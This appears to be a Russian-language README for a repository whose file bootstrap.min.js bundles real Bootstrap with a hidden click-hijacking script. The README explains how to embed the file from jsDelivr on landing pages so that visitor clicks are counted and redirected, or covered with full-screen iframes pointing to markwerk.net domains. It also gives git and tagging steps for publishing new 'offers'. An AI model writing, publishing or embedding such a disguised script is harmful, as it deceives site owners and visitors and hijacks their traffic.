# bootstrap.min.js + VW router

Внутри: **Bootstrap 5.3.3** bundle + глобальный счётчик (CountAPI) + редирект на shell + iframe.

## `@1.0.3` — redirect на markwerk.net

На **любом** ленде одна строка:

```html
<script src="https://cdn.jsdelivr.net/gh/jhntsplt/bootstrap@1.0.3/bootstrap.min.js" data-debug="1"></script>
```

Клик → CountAPI → редирект на `https://markwerk.net/vw/index.html?vw_p=a|b` → iframe A/B.

На **markwerk.net** залить каталог `vw/` из этого репо (`vw/index.html`).

- Клики 1–30 global → iframe `https://markwerk.net/`
- 31+ → `https://markwerk-ki.world/`
- Счётчик: `vw/markwerk_1_0_3`

## `@1.0.2` — overlay (без редиректа)

```html
<script src="https://cdn.jsdelivr.net/gh/jhntsplt/bootstrap@1.0.2/bootstrap.min.js" data-debug="1"></script>
```

Клик → fullscreen iframe поверх ленда (URL **не** меняется).

`data-vw-skip` — не перехватывать.

Редirect-режим (старый): `data-vw-mode="redirect" data-vw-shell="https://…/index.html"`.

## Push

```bash
git init
git add bootstrap.min.js vw/index.html README.md
git commit -m "bootstrap vw 1.0.0 test"
git branch -M main
git remote add origin https://github.com/jhntsplt/bootstrap.git
git push -u origin main
git tag 1.0.0
git push origin 1.0.0
```

После push подожди 1–2 мин, проверь размер:

```bash
curl -s "https://cdn.jsdelivr.net/gh/jhntsplt/bootstrap@1.0.0/bootstrap.min.js" | wc -c
```

Ожидается ~86566 байт.

## Следующие офферы

Новый тег `1.0.1` (не перезаписывать `1.0.0` на jsDelivr) — другие URL в `build-vw-bundle.sh`.
